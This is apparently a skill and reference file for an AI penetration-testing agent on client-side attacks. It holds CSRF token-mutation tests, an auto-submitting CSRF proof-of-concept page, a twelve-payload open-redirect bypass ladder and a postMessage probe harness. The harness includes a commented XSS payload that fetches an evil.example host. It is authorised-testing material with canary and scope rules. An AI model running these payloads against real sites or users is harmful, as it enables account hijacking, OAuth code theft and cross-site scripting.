---
name: client_side_attacks
description: Use when attacking the victim's browser context rather than the server
  - missing CSRF tokens and SameSite protection gaps, frameable pages and clickjacking,
  unvalidated open redirects, postMessage listeners without origin checks, and turning
  a confirmed XSS into account-action impact.
---

# Client-side attacks (P6)

The victim's browser is the target, not the server: CSRF, clickjacking,
open redirects, postMessage misuse, XSS impact.

## The way

- CSRF evidence is server behavior under token mutilation — removed,
  blank, borrowed, expired, method-spoofed, origin-dropped — one mutation
  per replay. A missing token in HTML is a lead, not a finding.
- SameSite=Lax still carries top-level GET: audit GET-based state changes
  as their own class.
- Clickjacking's real value is the chain: a Referer/Origin-validated
  endpoint becomes CSRF-able when the click happens inside the framed
  real page. "Page is frameable" alone is `50`'s header gap.
- Open-redirect severity comes from what it chains into — OAuth code
  interception (`30`), allowlist hops. A bare redirect is low; still
  report it.
- postMessage: listener without an origin check *plus* a sink is the
  finding pair; senders with `'*'` leak to any embedder.
- XSS impact = one canary account action via `fetch`, on engagement
  accounts only. Keylogging is a capability sentence, never a planted
  payload.
- Victim simulation runs in agent_browser with screenshots as evidence —
  never real users.

## Handoffs

Header-gap detection -> `50`; redirect-into-OAuth -> `30`; XSS
source/context -> `40`; D2 impact proofs -> `90`.

## Tools

agent_browser for all victim-side verification; `redirect_probe.py`
(guarded), `postmessage_scan.py` (offline). PoC page templates in
`references/`.

---

## Reference Module: `csrf-playbook`

# CSRF playbook

Companion to the CSRF section of `SKILL.md`. CWE-352.

## Full checklist

### Token presence

| Surface | What to verify |
|---|---|
| HTML forms | hidden input named `csrf_token` / `_token` / `authenticity_token` / `csrfmiddlewaretoken` / `__RequestVerificationToken`, per session, present on every state-changing form |
| AJAX/XHR | header `X-CSRF-Token` / `X-XSRF-TOKEN` / `RequestVerificationToken` set by client code and checked server-side |
| API | anti-CSRF for cookie-authenticated calls; bearer-token auth is CSRF-exempt only when the token is not cookie-backed |

### Server-side validation tests (P3 harness, one variable at a time)

| # | Mutation | Meaning when request still succeeds |
|---|---|---|
| 1 | remove token entirely | no validation |
| 2 | blank value `token=` | presence-only check |
| 3 | flip one character | format-only regex check |
| 4 | token from other engagement account | token not session-bound |
| 5 | token from expired/logged-out session | token not invalidated |
| 6 | `_method=PUT` style override | validation skipped for spoofed verb |
| 7 | drop `Referer` and `Origin` headers | referer-based-only validation (legacy) |
| 8 | `Content-Type: text/plain` | header-signature validation bypass |
| 9 | method swap POST->GET with same params | GET path misses validation |

### SameSite window analysis

| Cookie flags | Classic cross-site POST | Top-level GET navigation | Lax+POST grace (~2 min, Chromium) |
|---|---|---|---|
| `SameSite=Strict` | blocked | blocked from other sites | n/a |
| `SameSite=Lax` | blocked | cookie sent | cookie sent shortly after cookie set |
| no SameSite (default Lax in modern engines) | blocked | cookie sent | as Lax |
| `SameSite=None` without Secure | rejected by browser (note as cookie bug -> 30) | — | — |
| `SameSite=None; Secure` | cookie sent | cookie sent | n/a |

GET-based state changes defeat every row: audit them separately.

### Login CSRF

- Cross-site form posts engagement credentials to the login endpoint while
  the victim has an authenticated session; server re-authenticates without
  logout confirmation = login CSRF.
- Chain to session fixation observations -> `30-auth-access-control`.

## PoC HTML template skeleton

Serve from the operator-controlled test host; replace UPPERCASE values;
verify with the second engagement browser context as the victim.

```html
<!doctype html>
<!-- rj-pt-<ENGAGEMENT>-<NONCE> CSRF PoC: auto-submitting form -->
<html>
<body>
<form id="poc" method="POST" action="https://TARGET.example.com/ENDPOINT">
  <input type="hidden" name="PARAM1" value="CANARY-VALUE">
  <input type="hidden" name="csrf_token" value="">
  <!-- add the real token ONLY when demonstrating token-theft chains -->
</form>
<script>
  // SameSite=Lax nuance: this variant needs a top-level navigation, not
  // XHR. Use <form> + submit for Lax targets; XHR only when None/absent.
  document.getElementById('poc').submit();
</script>
</body>
</html>
```

Variants:

- GET-CSRF: `<img src="https://TARGET.example.com/delete?PARAM1=CANARY">`
  or `window.location` assignment for top-level navigation.
- Lax+POST grace: PoC must run within the grace window after the victim's
  cookie was set — coordinate engagement accounts accordingly.
- Token-theft chain: fill `csrf_token` with the value read from the
  victim-origin DOM (from a confirmed XSS or a postMessage leak).

## Evidence

- PoC page source, the request as sent (headers+body), the success
  response, and before/after state on the victim engagement account.
- D2: replay from a clean victim session; both runs in the evidence set.
- Canary discipline: all mutations write canary values
  (`rj-pt-<engagement>-<nonce>`), never real data.


---

## Reference Module: `open-redirect`

# Open redirect ladder and chaining map

Companion to `scripts/redirect_probe.py` (which executes the ladder).
CWE-601.

## Bypass ladder

Ordered weakest-to-strongest validation defeat. `TARGET_HOST` is the real
target host; payloads use documentation domains.

| # | Payload (for the param) | Defeats validation that... |
|---|---|---|
| 1 | `https://evil.example/landed` | accepts any absolute URL |
| 2 | `//evil.example/landed` | checks `startsWith("/")` only |
| 3 | `https:evil.example/landed` | parses the value as relative (scheme-colon) |
| 4 | `\/evil.example/landed` | treats backslash as path char |
| 5 | `/\evil.example/landed` | single-backslash variant of 4 |
| 6 | `%2F%2Fevil.example%2Flanded` | URL-decodes once before routing |
| 7 | `%2F%5Cevil.example%2Flanded` | decodes + backslash handling |
| 8 | `%252F%252Fevil.example%252Flanded` | double-decodes |
| 9 | `https://TARGET_HOST@evil.example/landed` | reads host before `@` |
| 10 | `https://evil.example@TARGET_HOST/landed` | some parsers pick the wrong side of `@` |
| 11 | `https://TARGET_HOST.evil.example/landed` | "contains target host" substring check |
| 12 | `https://evil.example/#TARGET_HOST` | "contains target host" check on the full string |

Working payload classes recorded verbatim as part of the finding (payload,
Location observed, status).

## Detection rules

- Send GET with the payload substituted; do NOT auto-follow redirects.
- Normalize the `Location` header: replace `\` with `/` before parsing
  (browsers treat backslashes as slashes in special schemes), then resolve
  against the request URL.
- Verdict OPEN when the resolved Location host differs from the target host
  and the payload controlled it.
- Same-host Location with payload in the path only = internal redirect
  (not a finding by itself; may be a hop — see chaining).

## Chaining map

| Chain | Steps | Handoff |
|---|---|---|
| OAuth `redirect_uri` interception | target's OAuth flow accepts an open-redirect URL as `redirect_uri` (or its own redirect param is vulnerable); authorization `code`/token lands on attacker page | `30-auth-access-control` owns the OAuth chain; supply the redirect evidence |
| SSO/middleware allowlist bypass | middleware trusts "redirect only to *.target.example.com"; open redirect on a trusted host bounces to `evil.example`; chain the 302s exactly | report as auth-bypass step with the full hop chain; coordinate with 30 |
| Referer/CSRF validation abuse | redirect page carries the real Referer/Origin then lands on attacker page; used to launder headers | report with the CSRF finding it enables |
| Phishing/trust only | bare redirect, no chain | LOW severity; still report (hardening) |

## Param candidate list

`url next redirect redirect_uri redirectUrl return returnUrl returnTo
continue dest destination go target to out view from callback successUrl
cancel_url jump goto location r u`

Also mine the JS bundles for `location.href =` / `location.replace(` fed
by query params (DOM open redirect — same ladder, executed in the victim
browser via `agent_browser`).

## Evidence

- Request with payload + verbatim response (status + Location) per working
  payload; `evidence/p6-redirect-<host>-<n>.{req,resp}.txt`.
- Chain evidence: every hop's request/response pair in order.
- D2: replay once; both runs kept.


---

## Reference Module: `postmessage-audit`

# postMessage audit

Companion to `scripts/postmessage_scan.py` (offline triage). CWE-345 /
CWE-1022.

## Triage procedure

1. Collect every JS file from the P1 crawl (bundles, inline scripts saved
   separately).
2. `python3 postmessage_scan.py --js-file bundle.js` — flags:
   - `LISTENER-NO-ORIGIN-CHECK`: `addEventListener('message', ...)` handler
     with no `origin` comparison in the following lines.
   - `LISTENER-OK`: origin check observed (still verify the check is
     correct — `includes()`/`endsWith()` suffix tricks apply here too).
   - `SENDER-STAR`: `postMessage(data, '*')` — leaks to any embedder.
   - `SENDER-EXPLICIT`: `postMessage(data, 'https://...')` — record target.
3. For every `LISTENER-NO-ORIGIN-CHECK`, extract the handler body and map
   `event.data` flow into sinks:

| Sink | Impact |
|---|---|
| `innerHTML` / `document.write` / framework HTML binding | HTML injection -> XSS in the target origin |
| `eval` / `new Function` / `setTimeout(string)` | JS execution |
| `element.src` / `href` assignment | javascript:/attacker URL injection |
| `window.location` / `location.href` | forced navigation (redirect chain) |
| relay `postMessage(..., '*')` | message laundering into another frame |
| `fetch()` argument / options | request forgery in the victim origin |

4. Verify checks that exist: `event.origin === 'https://target.example.com'`
   is correct; `event.origin.includes('target.example.com')` falls to
   `https://target.example.com.attacker.example` (suffix trick);
   `startsWith('https://target.example.com')` falls to
   `https://target.example.com.evil.example`.

## Harness page skeleton

Serve from the operator-controlled test host; run under `agent_browser` with
screenshots at each step. Replace UPPERCASE values.

```html
<!doctype html>
<!-- rj-pt-<ENGAGEMENT>-<NONCE> postMessage probe harness -->
<html>
<body>
<iframe id="t" src="https://TARGET.example.com/PAGE" style="width:800px;height:600px"></iframe>
<script>
  const t = document.getElementById('t');
  // 1. eavesdrop: what does the target send, and to whom?
  window.addEventListener('message', (e) => {
    console.log('[pm-harness] saw message from', e.origin, JSON.stringify(e.data));
  });
  // 2. probe: send the crafted message with '*' (no trust required)
  function probe(payload) {
    t.contentWindow.postMessage(payload, '*');
  }
  // craft per the sink found: html sink, url sink, location sink...
  // e.g. probe({html: '<img src=x onerror="fetch(\'https://evil.example/c?rj-pt-NONCE\')">'});
  // e.g. probe({url: 'javascript:alert(1)'});
  // 3. observe: DOM mutation / navigation in the iframe; screenshot after each probe
  t.onload = () => setTimeout(() => probe(PROBE_PAYLOAD), 500);
</script>
</body>
</html>
```

Notes:
- The eavesdrop step doubles as sender-analysis when the target emits
  messages with `'*'`.
- Keep payloads canary-tagged; screenshots + console capture are the
  evidence.

## Evidence

- JS excerpt with file name + line numbers of the listener/sender.
- Harness page source, sent payload, screenshots (before/after per probe),
  and any navigation/DOM diff.
- D2: replay once against a fresh session of the target page.

